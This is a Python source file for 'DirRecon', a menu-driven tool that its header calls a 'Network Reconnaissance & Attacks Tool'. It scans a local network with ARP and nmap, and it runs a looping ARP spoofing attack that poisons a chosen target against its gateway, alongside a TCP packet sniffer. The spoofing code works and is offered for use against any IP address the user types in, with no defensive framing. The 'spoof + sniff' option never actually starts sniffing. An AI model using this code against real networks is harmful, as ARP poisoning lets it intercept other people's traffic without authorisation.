# tool-name : DirRecon
# tool-version : 1.0.0
# tool-purpose : Directory Enumeration & USED IN SOME COMMON NET ATTACKS
# tel : +20100773914
# country : Egypt
# Founder : Yusef Mohey
# -----------------------------------------------------------
# importing moduels
# -----------------------------------------------------------
# who acess the code has the premissions to edit the functions if it wrong or develpoe it , & thanks
import time
import socket
import platform
import nmap
from scapy.all import ARP, Ether, srp, sniff, send
from scapy.layers.inet import TCP
from colorama import init, Fore
# -----------------------------------------------------------
# Initialize colorama
# -----------------------------------------------------------
init()
# -----------------------------------------------------------
# Network Scanning
# -----------------------------------------------------------
def get_os_name():
    return platform.system()
def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except:
        return "Unknown"
def get_os_name_guess(ip):
    try:
        nm = nmap.PortScanner()
        nm.scan(ip, arguments="-O")
        if 'osmatch' in nm[ip]:
            return nm[ip]['osmatch'][0]['name']
        else:
            return "Unknown"
    except:
        return "Unknown"

def scan_ports(ip):
    ports_info = {}
    try:
        nm = nmap.PortScanner()
        nm.scan(ip, arguments="-sS -sV -T4")
        for proto in nm[ip].all_protocols():
            lport = nm[ip][proto].keys()
            for port in lport:
                service = nm[ip][proto][port]['name']
                ports_info[port] = service
    except Exception as e:
        ports_info["error"] = str(e)
    return ports_info

def scan_network(ip_range="192.168.1.0/24"):
    print(Fore.YELLOW + f"[+] Scanning Network: {ip_range}")
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=0)[0]
    devices = []
    for sent, received in result:
        device_info = {
            "ip": received.psrc,
            "mac": received.hwsrc,
            "hostname": get_hostname(received.psrc),
            "os": get_os_name_guess(received.psrc)
        }
        devices.append(device_info)
    return devices
def full_network_scan(ip_range="192.168.1.0/24"):
    devices = scan_network(ip_range)
    for device in devices:
        print(Fore.CYAN + f"\n[+] Device Found: {device['ip']}")
        print(Fore.GREEN + f"  MAC Address  : {device['mac']}")
        print(Fore.GREEN + f"  Hostname     : {device['hostname']}")
        print(Fore.GREEN + f"  OS Guess     : {device['os']}")

        print(Fore.YELLOW + f"  [+] Scanning Open Ports...")
        ports = scan_ports(device['ip'])
        for port, service in ports.items():
            print(Fore.MAGENTA + f"    Port {port}: {service}")
# -----------------------------------------------------------
# ARP Spoofing
# -----------------------------------------------------------
def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    for _, rcv in ans:
        return rcv[Ether].src
    return None
def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(Fore.RED + f"[!] Could not find MAC address for {target_ip}")
        return
    spoof_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(spoof_packet, verbose=0)
    print(Fore.GREEN + f"[+] Sent ARP spoof packet to {target_ip} claiming to be {spoof_ip}")
# -----------------------------------------------------------
# Packet Sniffer
# -----------------------------------------------------------
def packet_analyzer(pkt):
    if pkt.haslayer(TCP):
        print(Fore.YELLOW + f"[TCP Packet] {pkt.summary()}")
        print(Fore.CYAN + "-" * 60)
def start_sniffing(interface="eth0"):
    print(Fore.BLUE + f"[+] Starting packet sniffing on interface: {interface}")
    sniff(iface=interface, prn=packet_analyzer, store=False)
# -----------------------------------------------------------
# Spoof + Sniff Combined
# -----------------------------------------------------------
def run_spoof_and_sniff(target_ip, gateway_ip, interface="eth0"):
    print(Fore.RED + "[*] Starting ARP Spoofing and Sniffing...")
    try:
        while True:
            arp_spoof(target_ip, gateway_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Detected CTRL+C! Stopping spoof and sniff.")
# -----------------------------------------------------------
# MAIN()
# -----------------------------------------------------------
def main():
    while True:
        print(Fore.YELLOW + """
        [1] Scan Local Network
        [2] Start ARP Spoofing
        [3] Start Packet Sniffing
        [4] Start Spoof + Sniff
        [0] Exit
        """)
        choice = input(Fore.GREEN + "Select an option: ").strip()
        if choice == "1":
            ip_range = input("Enter IP range (default 192.168.1.0/24): ").strip() or "192.168.1.0/24"
            full_network_scan(ip_range)
        elif choice == "2":
            target_ip = input("Enter Target IP: ").strip()
            spoof_ip = input("Enter Spoof IP (e.g. Gateway IP): ").strip()
            while True:
                try:
                    arp_spoof(target_ip, spoof_ip)
                    time.sleep(2)
                except KeyboardInterrupt:
                    print(Fore.RED + "\n[!] Stopping ARP Spoofing...")
                    break
        elif choice == "3":
            interface = input("Enter Interface (e.g. wlan0, eth0): ").strip()
            start_sniffing(interface)
        elif choice == "4":
            target_ip = input("Enter Target IP: ").strip()
            gateway_ip = input("Enter Gateway IP: ").strip()
            interface = input("Enter Interface (e.g. wlan0, eth0): ").strip()
            run_spoof_and_sniff(target_ip, gateway_ip, interface)
        elif choice == "0":
            print(Fore.CYAN + "[*] Exiting...")
            break
        else:
            print(Fore.RED + "[!] Invalid choice. Try again.")
if __name__ == "__main__":
    print(Fore.CYAN + """DirRecon v1.0.0 - Developed by Yusef Mohey [+] Network Reconnaissance & Attacks Tool """)
    main()
    # Example Usage:
    # full_network_scan("192.168.1.0/24")
    # run_spoof_and_sniff("192.168.1.105", "192.168.1.1", "wlan0")
    # start_sniffing("wlan0")
    # Uncomment as needed:
    # full_network_scan("192.168.1.0/24")
    # run_spoof_and_sniff("192.168.1.105", "192.168.1.1", "wlan0")
    # start_sniffing("wlan0")
